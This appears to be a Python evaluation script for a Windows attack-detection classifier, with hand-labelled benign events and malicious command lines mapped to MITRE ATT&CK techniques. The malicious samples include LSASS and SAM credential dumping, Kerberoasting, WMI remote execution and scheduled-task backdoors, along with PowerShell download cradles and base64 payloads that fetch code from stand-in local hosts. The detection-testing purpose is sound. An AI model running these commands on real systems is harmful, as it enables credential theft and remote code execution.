"""Independent labeled evaluation set.

Ground-truth labels are assigned by hand based on MITRE ATT&CK technique descriptions,
NOT by auto_label_event() (which uses the same domain knowledge as Phase 1 features).
This breaks the circular dependency between Phase 1 feature engineering and evaluation.

Attack techniques covered (none appear in the 6 OTRF training ZIPs):
  T1558.003 Kerberoasting  — SPN enumeration, Invoke-Kerberoast
  T1003.001 LSASS dump     — procdump, task manager, comsvcs.dll MiniDump
  T1021.006 WMI exec       — wmic process call create for lateral movement
  T1053.005 Sched task     — schtasks /create for persistence (EID 4698)
  T1059.001 PS obfuscated  — base64-encoded PowerShell payloads

Benign baseline covers 5 standard Windows subsystem processes.

For each malicious event, a comment explains: (a) what technique it represents,
(b) whether the current Phase 1 / Phase 2 features should catch it, and
(c) expected classifier behavior (TP vs expected FN).

Usage:
    cd /mnt/d/ML/tmdp-sandbox
    python runs/run_independent_eval.py

Outputs (runs/independent_eval/):
    summary.txt     — precision / recall / F1 per technique + overall
    results.json    — per-event predictions
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from tmdp_sandbox.classifier import MLCommandClassifier, load_classifier
from tmdp_sandbox.event_spec import EventSpec
from tmdp_sandbox.preprocessing import extract_features_for_sequence

REPO_ROOT = Path(__file__).parent.parent
MODEL_PATH = REPO_ROOT / "models" / "ml_classifier_logistic.joblib"
OUT_DIR = Path(__file__).parent / "independent_eval"

# ---------------------------------------------------------------------------
# Independent test set
# Labels are expert-assigned, NOT from auto_label_event().
# ---------------------------------------------------------------------------

def _b(process: str, cmd: str, eid: int | None = None, parent: str = "services.exe") -> EventSpec:
    return EventSpec(
        process_name=process, command_line=cmd,
        user_name="NT AUTHORITY\\SYSTEM", parent_process=parent,
        event_id=eid, label="benign",
    )


def _m(process: str, cmd: str, eid: int | None = None, parent: str = "explorer.exe",
        user: str = "CONTOSO\\user") -> EventSpec:
    return EventSpec(
        process_name=process, command_line=cmd,
        user_name=user, parent_process=parent,
        event_id=eid, label="malicious",
    )


# ── Benign baseline — 5 standard Windows subsystem processes ──────────────────
# These are the sorts of events a healthy Windows system produces continuously.
# Expected: all predicted benign (TN).  Any FP here is a false alarm.

BENIGN_EVENTS: list[tuple[str, EventSpec]] = [
    # Windows Service Host covering various service groups
    ("benign-svchost-netsvcs",
     _b("svchost.exe", "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule", eid=4688)),
    ("benign-svchost-localservice",
     _b("svchost.exe", "C:\\Windows\\System32\\svchost.exe -k LocalService -p", eid=4688)),
    # Session Manager (always-on Windows component)
    ("benign-smss",
     _b("smss.exe", "\\SystemRoot\\System32\\smss.exe", eid=4688, parent="system")),
    # Runtime Broker (UWP app isolation)
    ("benign-runtimebroker",
     _b("runtimebroker.exe", "C:\\Windows\\System32\\RuntimeBroker.exe -Embedding", eid=4688,
        parent="svchost.exe")),
    # Search Indexer (background file indexing)
    ("benign-searchindexer",
     _b("searchindexer.exe",
        "C:\\Windows\\system32\\SearchIndexer.exe /Embedding", eid=4688,
        parent="services.exe")),
    # Windows Update Agent (normal update activity)
    ("benign-wuauclt",
     _b("wuauclt.exe", "wuauclt.exe /UpdateDeploymentProvider wuaueng.dll /RunHandlerComServer",
        eid=4688, parent="svchost.exe")),
    # Shell extension (DLL hosting)
    ("benign-dllhost",
     _b("dllhost.exe", "C:\\Windows\\system32\\dllhost.exe /Processid:{AB8902B4-09CA-4BB6-B78D}",
        eid=4688, parent="svchost.exe")),
    # Print spooler
    ("benign-spoolsv",
     _b("spoolsv.exe", "C:\\Windows\\System32\\spoolsv.exe", eid=4688, parent="services.exe")),
    # Winlogon session management
    ("benign-winlogon",
     _b("winlogon.exe", "winlogon.exe", eid=4688, parent="smss.exe")),
    # Windows Init
    ("benign-wininit",
     _b("wininit.exe", "wininit.exe", eid=4688, parent="smss.exe")),
]

# ── T1558.003 Kerberoasting ───────────────────────────────────────────────────
# Attacker enumerates SPNs and requests TGS tickets for offline cracking.
# Reference: https://attack.mitre.org/techniques/T1558/003/
#
# Coverage analysis:
#   powershell.exe → IN _SUSPICIOUS_PROCESSES → should catch (TP)
#   setspn.exe     → NOT in _SUSPICIOUS_PROCESSES → likely missed (FN)
#   klist.exe      → IN _SUSPICIOUS_PROCESSES (recon tool) → should catch (TP)

KERBEROASTING_EVENTS: list[tuple[str, EventSpec]] = [
    # PowerShell Invoke-Kerberoast — standard Kerberoasting tool
    # Expected: TP (powershell.exe + Invoke-Kerberoast keyword)
    ("kerb-invoke-kerberoast",
     _m("powershell.exe",
        "powershell.exe -NoProfile -Command \"Import-Module .\\Invoke-Kerberoast.ps1; "
        "Invoke-Kerberoast -OutputFormat Hashcat | Out-File -Encoding ASCII kerberoast.txt\"",
        eid=4688)),
    # setspn.exe SPN enumeration — NOT a LOLBin in our list
    # Expected: FN (setspn.exe not in _SUSPICIOUS_PROCESSES)
    ("kerb-setspn-enum",
     _m("setspn.exe", "setspn.exe -Q */*", eid=4688)),
    # setspn targeting specific account
    # Expected: FN (same reason)
    ("kerb-setspn-target",
     _m("setspn.exe", "setspn.exe -T contoso.local -Q */* -U", eid=4688)),
    # klist.exe listing cached tickets — recon tool in our list
    # Expected: TP (klist.exe in _SUSPICIOUS_PROCESSES)
    ("kerb-klist",
     _m("klist.exe", "klist.exe tickets", eid=4688)),
    # PowerShell Get-SPNs alternative script
    # Expected: TP (powershell.exe in _SUSPICIOUS_PROCESSES)
    ("kerb-get-spns",
     _m("powershell.exe",
        "powershell.exe -ep bypass -c \"& .\\Get-SPN.ps1 -ComputerName *\"",
        eid=4688)),
]

# ── T1003.001 LSASS Memory Credential Dump ───────────────────────────────────
# Attacker extracts credentials from lsass.exe memory.
# Reference: https://attack.mitre.org/techniques/T1003/001/
#
# Coverage analysis:
#   procdump.exe   → NOT in _SUSPICIOUS_PROCESSES → expected FN
#   reg.exe save   → IN _SUSPICIOUS_PROCESSES + SAM path → should catch (TP)
#   comsvcs.dll via rundll32 → rundll32 IN _SUSPICIOUS_PROCESSES → should catch (TP)

LSASS_DUMP_EVENTS: list[tuple[str, EventSpec]] = [
    # procdump64.exe lsass dump — Sysinternals tool, NOT in LOLBin list
    # Expected: FN (procdump.exe not in _SUSPICIOUS_PROCESSES)
    ("lsass-procdump",
     _m("procdump.exe", "procdump.exe -accepteula -ma lsass.exe C:\\Temp\\lsass.dmp", eid=4688)),
    # procdump variant with -64
    # Expected: FN
    ("lsass-procdump64",
     _m("procdump64.exe", "procdump64.exe -ma lsass.exe lsass.dmp", eid=4688)),
    # reg.exe save HKLM\SAM — dumps SAM hive containing local account hashes
    # Expected: TP (reg.exe in _SUSPICIOUS_PROCESSES; SAM path matches persistence RE)
    ("lsass-reg-save-sam",
     _m("reg.exe", "reg.exe save HKLM\\SAM C:\\Temp\\sam.save", eid=4688)),
    # rundll32 comsvcs.dll MiniDump — LOLBin LSASS dump technique
    # Expected: TP (rundll32.exe in _SUSPICIOUS_PROCESSES)
    ("lsass-rundll32-comsvcs",
     _m("rundll32.exe",
        "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 652 C:\\Temp\\lsass.dmp full",
        eid=4688)),
    # Process access to lsass (EID 10 — Sysmon process access)
    # Expected: TP via auto_label_event EID 10 → access lsass.exe path
    ("lsass-process-access",
     _m("mimikatz.exe", "access lsass.exe flags=0x1fffff",
        eid=10, parent="lsass.exe")),
]

# ── T1021.006 WMI Lateral Movement ───────────────────────────────────────────
# Attacker executes code on remote host via WMIC.
# Reference: https://attack.mitre.org/techniques/T1021/006/
#
# Coverage: wmic.exe IN _SUSPICIOUS_PROCESSES → all expected TP

WMI_LATERAL_EVENTS: list[tuple[str, EventSpec]] = [
    # Classic wmic lateral movement
    # Expected: TP
    ("wmi-exec-remote",
     _m("wmic.exe",
        "wmic.exe /node:192.168.1.50 /user:Administrator /password:Password1 "
        "process call create \"cmd.exe /c whoami > C:\\output.txt\"",
        eid=4688)),
    # wmic spawning meterpreter stager
    # Expected: TP
    ("wmi-exec-meterpreter",
     _m("wmic.exe",
        "wmic.exe /node:10.0.0.5 process call create "
        "\"powershell.exe -w hidden -nop -c IEX (New-Object Net.WebClient).DownloadString"
        "('http://10.0.0.1/payload')\"",
        eid=4688)),
    # wmic as recon tool (process list on remote host)
    # Expected: TP
    ("wmi-recon-remote",
     _m("wmic.exe",
        "wmic.exe /node:dc01.contoso.local process list brief",
        eid=4688)),
]

# ── T1053.005 Scheduled Task Persistence ─────────────────────────────────────
# Attacker creates scheduled task for persistence.
# Reference: https://attack.mitre.org/techniques/T1053/005/
#
# Coverage:
#   EID 4698 → IN _ATTACK_EVENT_IDS → auto_label_event returns "malicious" → TP
#   schtasks.exe → IN _SUSPICIOUS_PROCESSES → TP via process check

SCHED_TASK_EVENTS: list[tuple[str, EventSpec]] = [
    # Scheduled task creation event (Windows Security EID 4698)
    # Expected: TP via _ATTACK_EVENT_IDS
    ("schtask-eid4698",
     _m("svchost.exe",
        "A scheduled task was created: \\WindowsUpdate "
        "C:\\ProgramData\\backdoor.exe /q",
        eid=4698, parent="services.exe", user="CONTOSO\\svc-account")),
    # schtasks.exe CLI — direct task creation via command
    # Expected: TP (schtasks.exe in _SUSPICIOUS_PROCESSES)
    ("schtask-cli-create",
     _m("schtasks.exe",
        "schtasks.exe /create /tn \"WindowsUpdate\" /sc onlogon "
        "/tr \"C:\\ProgramData\\backdoor.exe\" /ru System /f",
        eid=4688)),
    # at.exe legacy scheduled job (EID 4698)
    # Expected: TP (at.exe in _SUSPICIOUS_PROCESSES)
    ("schtask-at-exe",
     _m("at.exe", "at.exe 12:00 /every:M,T,W,Th,F cmd.exe /c net user admin P@ss /add",
        eid=4688)),
]

# ── T1059.001 PowerShell Obfuscated Execution ─────────────────────────────────
# Attacker delivers payload via obfuscated PowerShell.
# Reference: https://attack.mitre.org/techniques/T1059/001/
#
# Coverage: powershell.exe in _SUSPICIOUS_PROCESSES + obfuscation patterns → all TP

PS_OBFUSCATED_EVENTS: list[tuple[str, EventSpec]] = [
    # Classic base64 encoded command — most common obfuscation
    # Expected: TP (powershell.exe + -enc pattern)
    ("ps-enc-cmd",
     _m("powershell.exe",
        "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass "
        "-EncodedCommand aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxAC8AcABhAHkAbABvAGEAZAAnACkA",
        eid=4688)),
    # IEX download cradle — well-known dropper pattern
    # Expected: TP
    ("ps-iex-download",
     _m("powershell.exe",
        "powershell.exe -w hidden -c \"IEX (New-Object Net.WebClient)"
        ".DownloadString('http://192.168.1.100/stager.ps1')\"",
        eid=4688)),
    # PowerShell ScriptBlock logging capture (EID 4104) — obfuscated content
    # Expected: TP via EID 4104 + _OBFUSCATION_RE match
    ("ps-scriptblock-iex",
     _m("powershell.exe",
        "IEX([System.Text.Encoding]::Unicode.GetString([System.Convert]"
        "::FromBase64String('aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA')))",
        eid=4104)),
    # Empire stager via bypass + download
    # Expected: TP
    ("ps-empire-stager",
     _m("powershell.exe",
        "powershell.exe -sta -nop -w hidden -EncodedCommand "
        "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAGEAZABtAGkAbgAvAGcAZQB0ACcAKQA=",
        eid=4688)),
]

# ── Aggregate all events ───────────────────────────────────────────────────────

TECHNIQUE_GROUPS: dict[str, list[tuple[str, EventSpec]]] = {
    "benign-baseline": BENIGN_EVENTS,
    "T1558.003-kerberoasting": KERBEROASTING_EVENTS,
    "T1003.001-lsass-dump": LSASS_DUMP_EVENTS,
    "T1021.006-wmi-lateral": WMI_LATERAL_EVENTS,
    "T1053.005-sched-task": SCHED_TASK_EVENTS,
    "T1059.001-ps-obfuscated": PS_OBFUSCATED_EVENTS,
}

# Expected FNs — techniques or tools not covered by the current LOLBin list.
# These are labeled here for comparison in the report.
EXPECTED_FN_NAMES = {
    "kerb-setspn-enum", "kerb-setspn-target",   # setspn.exe not in LOLBin list
    "lsass-procdump", "lsass-procdump64",         # procdump.exe not in LOLBin list
}


def _precision_recall_f1(tp: int, fp: int, fn: int) -> tuple[float, float, float]:
    prec = tp / (tp + fp) if (tp + fp) > 0 else 0.0
    rec = tp / (tp + fn) if (tp + fn) > 0 else 0.0
    f1 = 2 * prec * rec / (prec + rec) if (prec + rec) > 0 else 0.0
    return prec, rec, f1


def main() -> None:
    OUT_DIR.mkdir(parents=True, exist_ok=True)

    print(f"Loading classifier from {MODEL_PATH} ...")
    raw_pipeline = load_classifier(MODEL_PATH)
    classifier = MLCommandClassifier(raw_pipeline, window_size=10)

    all_ids: list[str] = []
    all_events: list[EventSpec] = []
    all_groups: list[str] = []
    for group, items in TECHNIQUE_GROUPS.items():
        for event_id, event in items:
            all_ids.append(event_id)
            all_events.append(event)
            all_groups.append(group)

    # Score each event via score_event so deterministic EID overrides apply.
    mal_scores = [
        classifier.score_event(event, tuple(all_events), i)
        for i, event in enumerate(all_events)
    ]
    THRESHOLD = 0.40  # T-MDP p* at c_compromise=10

    per_event_results: list[dict] = []
    group_stats: dict[str, dict] = {g: {"tp": 0, "fp": 0, "fn": 0, "tn": 0} for g in TECHNIQUE_GROUPS}

    for i, (eid, event, group) in enumerate(zip(all_ids, all_events, all_groups)):
        score = float(mal_scores[i])
        predicted_malicious = score >= THRESHOLD
        actual_malicious = event.label == "malicious"

        if actual_malicious and predicted_malicious:
            outcome = "TP"
            group_stats[group]["tp"] += 1
        elif not actual_malicious and not predicted_malicious:
            outcome = "TN"
            group_stats[group]["tn"] += 1
        elif actual_malicious and not predicted_malicious:
            outcome = "FN"
            group_stats[group]["fn"] += 1
            if eid not in EXPECTED_FN_NAMES:
                outcome = "FN-UNEXPECTED"
        else:
            outcome = "FP"
            group_stats[group]["fp"] += 1

        per_event_results.append({
            "id": eid,
            "group": group,
            "label": event.label,
            "score": round(score, 4),
            "predicted": "malicious" if predicted_malicious else "benign",
            "outcome": outcome,
            "expected_fn": eid in EXPECTED_FN_NAMES,
        })

    (OUT_DIR / "results.json").write_text(json.dumps(per_event_results, indent=2))

    lines = [
        "Independent Labeled Evaluation Set",
        f"Threshold: p*={THRESHOLD} (T-MDP c_compromise=10, c_block=5, c_execute=1)",
        f"Ground truth: expert-labeled (not auto_label_event)",
        "=" * 72,
        "",
        f"  {'Technique group':<32} {'n':>4} {'TP':>4} {'FP':>4} {'FN':>4} {'TN':>4}"
        f"  {'Prec':>6} {'Rec':>6} {'F1':>6}",
        f"  {'-'*72}",
    ]

    total_tp = total_fp = total_fn = total_tn = 0
    for group, stats in group_stats.items():
        tp, fp, fn, tn = stats["tp"], stats["fp"], stats["fn"], stats["tn"]
        total_tp += tp; total_fp += fp; total_fn += fn; total_tn += tn
        n = tp + fp + fn + tn
        prec, rec, f1 = _precision_recall_f1(tp, fp, fn)
        lines.append(
            f"  {group:<32} {n:>4} {tp:>4} {fp:>4} {fn:>4} {tn:>4}"
            f"  {prec:>6.3f} {rec:>6.3f} {f1:>6.3f}"
        )

    lines.append(f"  {'-'*72}")
    n_total = total_tp + total_fp + total_fn + total_tn
    prec_all, rec_all, f1_all = _precision_recall_f1(total_tp, total_fp, total_fn)
    lines.append(
        f"  {'OVERALL (malicious only)':<32} {n_total:>4} {total_tp:>4} {total_fp:>4}"
        f" {total_fn:>4} {total_tn:>4}  {prec_all:>6.3f} {rec_all:>6.3f} {f1_all:>6.3f}"
    )

    lines += [
        "",
        "Per-event breakdown (FN and FP only):",
    ]
    fn_fp_rows = [r for r in per_event_results if r["outcome"] in {"FN", "FN-UNEXPECTED", "FP"}]
    if not fn_fp_rows:
        lines.append("  (none)")
    for r in fn_fp_rows:
        marker = " [UNEXPECTED]" if r["outcome"] == "FN-UNEXPECTED" else ""
        lines.append(f"  {r['outcome']:<4} {r['id']:<35} score={r['score']:.4f}{marker}")

    lines += [
        "",
        "Expected FNs (tools not in current LOLBin list):",
    ]
    for eid in sorted(EXPECTED_FN_NAMES):
        row = next((r for r in per_event_results if r["id"] == eid), None)
        if row:
            actual = row["outcome"]
            lines.append(f"  {eid:<35} → {actual} (score={row['score']:.4f})")

    lines += [
        "",
        f"Benign precision (no false alarms): "
        f"{1.0 - total_fp / (total_fp + group_stats['benign-baseline']['tn']):.3f}",
        f"Note: setspn.exe and procdump.exe are not in _SUSPICIOUS_PROCESSES —",
        f"      FNs there are a known LOLBin coverage gap, not classifier error.",
    ]

    summary = "\n".join(lines)
    print(f"\n{summary}")
    (OUT_DIR / "summary.txt").write_text(summary)
    print(f"\nResults → {OUT_DIR}/")


if __name__ == "__main__":
    main()
